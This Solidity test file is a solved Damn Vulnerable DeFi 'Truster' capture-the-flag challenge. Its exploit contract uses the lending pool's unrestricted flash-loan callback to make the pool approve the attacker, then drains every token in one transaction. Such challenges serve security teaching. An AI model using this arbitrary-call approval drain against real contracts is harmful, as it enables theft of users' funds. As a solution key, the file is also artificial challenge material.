// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";

contract TrusterChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    
    uint256 constant TOKENS_IN_POOL = 1_000_000e18;

    DamnValuableToken public token;
    TrusterLenderPool public pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Deploy token
        token = new DamnValuableToken();

        // Deploy pool and fund it
        pool = new TrusterLenderPool(token);
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(token.balanceOf(player), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_truster() public checkSolvedByPlayer {
        /* Deploy and exploit the vulnerability, 
           per new contract exploit code at end of file */
        new TrusterExploiter(pool, token, recovery);
    }


    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        // All rescued funds sent to recovery account
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}

/**
 * @notice Exploit contract to drain all DVT tokens from TrusterLenderPool in a single transaction
 * @dev Leverages the unrestricted `functionCall` in flashLoan to approve and transfer tokens
 * @param _pool Instance of the TrusterLenderPool being exploited
 * @param _token Instance of the DamnValuableToken managed by the pool
 * @param _recovery Target address to receive all stolen tokens
 */
contract TrusterExploiter {
    constructor(TrusterLenderPool _pool, DamnValuableToken _token, address _recovery) {
        // Encode call to approve this contract to spend all tokens held by the pool
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            _token.balanceOf(address(_pool))
        );

        // Trigger flash loan with zero amount, using encoded approval as payload
        // This forces the pool to approve this contract as spender for all its tokens
        _pool.flashLoan(0, address(this), address(_token), data);

        // Immediately transfer all approved tokens from pool to recovery address
        _token.transferFrom(address(_pool), _recovery, _token.balanceOf(address(_pool)));
    }
}   
